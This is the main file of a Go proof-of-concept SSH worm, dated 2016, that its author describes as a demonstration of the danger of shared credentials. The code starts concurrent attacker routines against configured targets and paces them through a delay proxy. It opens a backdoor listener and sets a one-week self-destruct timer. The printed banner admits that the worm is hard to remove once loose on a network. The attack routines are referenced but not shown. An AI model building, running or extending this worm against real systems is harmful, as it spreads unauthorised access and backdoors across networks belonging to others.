package main

/*
 * sshpocworm.go
 * Worm to demonstrate what happens when you have shared creds
 * By J. Stuart McMurray
 * Created 20160808
 * Last Modified 20160808
 */

import (
	"fmt"
	"log"
	"sync"
	"time"
)

func main() {
	/* Read binary */
	ReadBinary()

	/* Parse Config */
	if err := MakeConfig(); nil != err {
		log.Fatalf("Config error: %v", err)
	}

	/* Message that this isn't a blackhat tool */
	fmt.Printf(`                       THIS IS A SECURITY TESTING TOOL.

Please understand the implications before running it.

If you have found it on your network, please accept my apologies.  Either I
really goofed, your local security professionals are using my tool (neat!), or
some 1337 h4x0r got hold of it.

Per-host cleanup should be as simple as removing the binary.  On the network as
a whole, you can try to feed the version string
%q
used by this tool to your IDS/IPS, but in general, it's a worm.  They're hard
to get rid of.

`,
		CONFIG.Version,
	)

	/* Seed the random number generator */
	SeedPRNG()

	/* Start attackers */
	ach := make(chan string)
	for i := 0; i < CONFIG.Threads; i++ {
		go Attacker(ach)
	}

	/* Start delay proxy, to keep targets from going too fast */
	tch := make(chan string, len(CONFIG.Targets))
	go TargetDelay(ach, tch)

	/* Queue targets for attack */
	wg := &sync.WaitGroup{}
	wg.Add(len(CONFIG.Targets))
	for _, t := range CONFIG.Targets {
		go Targeter(tch, t, wg)
	}

	/* Close targeter channel when done */
	go func() {
		wg.Wait()
		close(tch)
	}()

	/* This program will self-destruct in one week */
	go func() {
		for i := 0; i < 60*60*24*7; i++ {
			time.Sleep(time.Second)
		}
		log.Fatalf("Done")
	}()

	/* Start backdoor listener */
	Backdoor()
	log.Printf("Done.")
}
